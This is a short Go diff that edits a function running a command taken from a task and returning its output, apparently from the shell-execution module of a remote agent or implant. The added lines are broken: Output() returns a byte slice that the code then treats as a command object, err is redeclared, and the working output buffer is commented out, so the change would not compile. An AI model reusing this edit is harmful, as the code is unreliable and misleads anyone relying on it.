@@ -23,17 +23,17 @@ func Run(task structs.Task) {
 			return
 	}
 
-	cmd := exec.Command(cmdBin, arg1).Output()
+	cmd, err := exec.Command(cmdBin, arg1).Output()
 	cmd.Stdin = strings.NewReader(task.Params)
-	var out bytes.Buffer
-	cmd.Stdout = &out
-	cmd.Stderr = &out
+	//var out bytes.Buffer
+	//cmd.Stdout = &out
+	//cmd.Stderr = &out
 	err := cmd.Run()
 	var outputString string
-	if out.String() == "" {
+	if cmd.String() == "" {
 		outputString = "Command processed (no output)."
 	} else {
-		outputString = out.String()
+		outputString = cmd.String()
 	}
 	msg.UserOutput = outputString
 	msg.Completed = true
